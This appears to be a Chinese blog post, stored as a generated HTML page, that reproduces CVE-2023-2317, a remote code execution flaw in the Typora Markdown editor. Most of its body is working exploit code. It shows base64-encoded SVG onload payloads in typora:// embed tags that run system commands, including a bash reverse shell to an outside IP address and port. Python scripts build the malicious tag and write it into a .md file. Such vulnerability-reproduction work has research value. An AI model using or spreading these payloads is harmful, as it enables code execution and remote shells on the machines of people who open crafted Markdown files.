@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="lhb">
+    
+    <title>
+        
+            漏洞复现：CVE-2023-2317 【Typora 远程代码执行漏洞】 |
+        
+        Jerem1ah&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/avatar.svg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.5.2"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Jerem1ah&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">漏洞复现：CVE-2023-2317 【Typora 远程代码执行漏洞】</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">lhb</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-09-17 23:13:55</span>
+        <span class="mobile">2023-09-17 23:13</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-09-17 23:15:41</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CVE/">CVE</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                <h1 id="漏洞复现：CVE-2023-2317-【Typora-远程代码执行漏洞】"><a href="#漏洞复现：CVE-2023-2317-【Typora-远程代码执行漏洞】" class="headerlink" title="漏洞复现：CVE-2023-2317 【Typora 远程代码执行漏洞】"></a>漏洞复现：CVE-2023-2317 【Typora 远程代码执行漏洞】</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/bktown/p/17673366.html" >https://www.cnblogs.com/bktown/p/17673366.html<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\01Solfware\01normal\11typora\Typora\resources\updater\updater.html</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> curVersion = <span class="regexp">/[?&amp;]curVersion=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> newVersion = <span class="regexp">/[?&amp;]newVersion=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> releaseNoteLink = <span class="built_in">decodeURIComponent</span>(<span class="regexp">/[?&amp;]releaseNoteLink=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>]);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> hideAutoUpdates = <span class="regexp">/[?&amp;]hideAutoUpdates=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>] == <span class="string">&quot;true&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> labels = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="built_in">decodeURIComponent</span>(<span class="regexp">/[?&amp;]labels=([^&amp;]+)/</span>.<span class="title function_">exec</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)[<span class="number">1</span>]));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#sum&quot;</span>).<span class="property">innerText</span> = labels[<span class="number">4</span>] + <span class="string">&quot; &quot;</span> + labels[<span class="number">5</span>].<span class="title function_">replace</span>(<span class="string">&quot;$1&quot;</span>, newVersion).<span class="title function_">replace</span>(<span class="string">&quot;$2&quot;</span>, curVersion);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;[data-label]&quot;</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">dom</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        dom.<span class="property">innerHTML</span> = labels[dom.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-label&quot;</span>) - <span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#release-panel&quot;</span>).<span class="property">src</span> = releaseNoteLink;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> autoUpdateInput = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#preference-enable-auto-update&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">      autoUpdateInput.<span class="property">checked</span> = !!isAutoUpdateEnabled;</span></span><br><span class="line"><span class="language-javascript">      autoUpdateInput.<span class="property">onchange</span> = toggleAutoUpdate;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span>(hideAutoUpdates) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#preference-enable-auto-update-wrapper&quot;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#skip-this-version-btn-group&quot;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updater.html?curVersion=1&amp;newVersion=2&amp;releaseNoteLink=3&amp;hideAutoUpdates=false&amp;labels=[&quot;&lt;input%20value=test&gt;&quot;,&quot;22&quot;,&quot;33&quot;,&quot;44&quot;,&quot;55&quot;,&quot;66&quot;,&quot;77&quot;]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;&quot;,&quot;&lt;svg/onload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;/svg&gt;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">reqnode</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>((&#123;<span class="title class_">Win32</span>: <span class="string">&#x27;calc&#x27;</span>, <span class="title class_">Linux</span>: <span class="string">&#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;</span>&#125;)[navigator.<span class="property">platform</span>.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">5</span>)])</span><br><span class="line"></span><br><span class="line">(&#123;<span class="title class_">Win32</span>: <span class="string">&#x27;calc&#x27;</span>, <span class="title class_">Linux</span>: <span class="string">&#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;</span>&#125;)[navigator.<span class="property">platform</span>.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">5</span>)]</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">这个标签包含了可疑的恶意代码,我不建议执行它。具体来看:</span><br><span class="line">&lt;svg&gt; - 表示这是一个SVG图像标签</span><br><span class="line">onload - 是一个事件属性,表示一旦SVG图像加载完成就执行该事件中的代码</span><br><span class="line">atob - 是一个函数,用于解码base64编码的字符串</span><br><span class="line">base64编码的字符串 - 包含了一段恶意的JavaScript代码,解码后大概功能是:</span><br><span class="line">1. 导入child_process模块</span><br><span class="line">2. 根据系统平台(Windows或Linux)执行不同的系统命令</span><br><span class="line">   Windows下执行calc计算器</span><br><span class="line">   Linux下执行gnome-calculator开启计算器</span><br><span class="line">3. 这样就实现了无需用户交互,SVG加载时在后台执行系统命令的效果</span><br><span class="line">所以这段代码包含了典型的XSS (跨站脚本) 攻击特征,可能是某种捣蛋或恶意代码,执行了意料之外的操作。为了安全起见,不要在不信任的页面中打开或执行该SVG图像。 （已编辑） </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">navigator.platform.substr(0,5)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这个代码片段似乎是用于检测用户的操作系统平台,然后根据平台执行不同的命令。</span><br><span class="line">具体来看:</span><br><span class="line">navigator.platform:获取浏览器运行的操作系统平台信息。</span><br><span class="line">navigator.platform.substr(0,5):取平台信息的前5个字符。</span><br><span class="line">对Windows系统,platform的值类似&quot;Win32&quot;或&quot;Win64&quot;。</span><br><span class="line">取前5个字符结果为&quot;Win32&quot;。</span><br><span class="line">对Linux系统,platform的值类似&quot;Linux x86_64&quot;。</span><br><span class="line">取前5个字符结果为&quot;Linux&quot;。</span><br><span class="line">所以这里是通过取平台信息的前5个字符,来判断用户的操作系统是Windows还是Linux。</span><br><span class="line">然后根据平台结果,在后续代码中执行不同的命令。</span><br><span class="line">这种根据用户操作系统执行不同代码的方式,在一些恶意代码或者黑客攻击中很常见。</span><br><span class="line">需要谨慎对待并仔细审查这种代码,不要在不信任的场景中执行,以防存在隐藏的恶意行为。</span><br><span class="line">总体来说,这段代码本身可能无害,但在某些上下文中可能被用做不好的用途。 （已编辑） </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)]解释一下代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这段代码是用于根据操作系统执行不同命令的,具体功能如下:</span><br><span class="line">1. 定义了一个对象,键是操作系统,值是要执行的命令字符串:</span><br><span class="line">  &#123;</span><br><span class="line">    Win32: &#x27;calc&#x27;,</span><br><span class="line">    Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">2. navigator.platform.substr(0,5) 用于获取浏览器运行的操作系统的前5个字符,如果是Windows则得到&quot;Win32&quot;,Linux则得到&quot;Linux&quot;。</span><br><span class="line">3. 然后根据操作系统的键,从对象中取出对应要执行的命令。</span><br><span class="line">4. 最后调用child_process.exec()执行取出的命令。</span><br><span class="line">所以整段代码的效果是:</span><br><span class="line">- 在Windows上,会启动计算器程序calc。</span><br><span class="line">- 在Linux上,会打开gnome-calculator计算器,并在其中执行一段代码。</span><br><span class="line">根据&quot;Typora RCE PoC&quot;的提示,这似乎是某种Typora编辑器的远程代码执行(RCE)漏洞的概念验证(PoC)代码。</span><br><span class="line">综上所述,这段代码包含了根据操作系统执行不同本地命令的功能,看起来存在不良用途,不建议在不信任的场景下执行。 （已编辑） </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#x27;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">(&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/39.105.51.11/7779 0&gt;&amp;1&quot;&#x27;&#125;)[navigator.platform.substr(0,5)]</span><br><span class="line"></span><br><span class="line">reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/39.105.51.11/7779 0&gt;&amp;1&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br><span class="line"></span><br><span class="line">cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMzkuMTA1LjUxLjExLzc3NzkgMD4mMSInfSlbbmF2aWdhdG9yLnBsYXRmb3JtLnN1YnN0cigwLDUpXSk=</span><br><span class="line"></span><br><span class="line">[&quot;&quot;,&quot;&lt;svg/onload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMzkuMTA1LjUxLjExLzc3NzkgMD4mMSInfSlbbmF2aWdhdG9yLnBsYXRmb3JtLnN1YnN0cigwLDUpXSk=&#x27;))&gt;<span class="tag">&lt;/<span class="name">svg</span>&gt;</span>&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[%22%22,%22%3Csvg/onload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMzkuMTA1LjUxLjExLzc3NzkgMD4mMSInfSlbbmF2aWdhdG9yLnBsYXRmb3JtLnN1YnN0cigwLDUpXSk=&#x27;))%3E%3C/svg%3E%22,%22%22,%22%22,%22%22,%22%22]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3Csvg/onload=top.eval(atob(&#x27;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMzkuMTA1LjUxLjExLzc3NzkgMD4mMSInfSlbbmF2aWdhdG9yLnBsYXRmb3JtLnN1YnN0cigwLDUpXSk=&#x27;))%3E%3C/svg%3E%22,%22%22,%22%22,%22%22,%22%22]&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.完全编码和不完全编码的区别就是对</span><br><span class="line">!*&#x27;();:@&amp;=+$,/?%#[]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="comment"># command = &#x27;&#x27;&#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">command = <span class="string">&#x27;&#x27;&#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;;bash -c &quot;bash -i &gt;&amp; /dev/tcp/39.105.51.11/7779 0&gt;&amp;1&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;calc&#x27;, Linux: \&#x27;&#x27;&#x27;&#x27;</span>+command+<span class="string">&#x27;&#x27;&#x27;\&#x27;&#125;)[navigator.platform.substr(0,5)])&#x27;&#x27;&#x27;</span></span><br><span class="line">payload_base64 = base64.b64encode(payload.encode()).decode()</span><br><span class="line">argument_raw = <span class="string">f&#x27;&#x27;&#x27;[&quot;&quot;,&quot;&lt;svg/onload=top.eval(atob(&#x27;<span class="subst">&#123;payload_base64&#125;</span>&#x27;))&gt;&lt;/svg&gt;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;]&#x27;&#x27;&#x27;</span></span><br><span class="line">argument_urlencode = quote(argument_raw,safe=<span class="string">&quot;!*&#x27;();:@&amp;=+$,?%#[]&quot;</span>)</span><br><span class="line">final_exp = <span class="string">f&#x27;&#x27;&#x27;&lt;embed style=&quot;height:0;&quot; src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=<span class="subst">&#123;argument_urlencode&#125;</span>&quot;&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(final_exp)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="comment"># command = &#x27;&#x27;&#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">command = <span class="string">&#x27;&#x27;&#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;reqnode(&#x27;child_process&#x27;).exec((&#123;Win64: &#x27;calc&#x27;, Linux: \&#x27;&#x27;&#x27;&#x27;</span>+command+<span class="string">&#x27;&#x27;&#x27;\&#x27;&#125;)[navigator.platform.substr(0,5)])&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;reqnode(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line">payload_base64 = base64.b64encode(payload.encode()).decode()</span><br><span class="line">argument_raw = <span class="string">f&#x27;&#x27;&#x27;[&quot;&quot;,&quot;&lt;svg/onload=top.eval(atob(&#x27;<span class="subst">&#123;payload_base64&#125;</span>&#x27;))&gt;&lt;/svg&gt;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;]&#x27;&#x27;&#x27;</span></span><br><span class="line">argument_urlencode = quote(argument_raw,safe=<span class="string">&quot;!*&#x27;();:@&amp;=+$,?%#[]&quot;</span>)</span><br><span class="line">final_exp = <span class="string">f&#x27;&#x27;&#x27;&lt;embed style=&quot;height:0;&quot; src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=<span class="subst">&#123;argument_urlencode&#125;</span>&quot;&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(final_exp)</span><br><span class="line"></span><br><span class="line">final_exp = final_exp + <span class="string">&#x27;\n\n&#x27;</span> + <span class="string">&#x27;```\ntest\n```&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test_exp.md&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(final_exp)</span><br></pre></td></tr></table></figure>
+
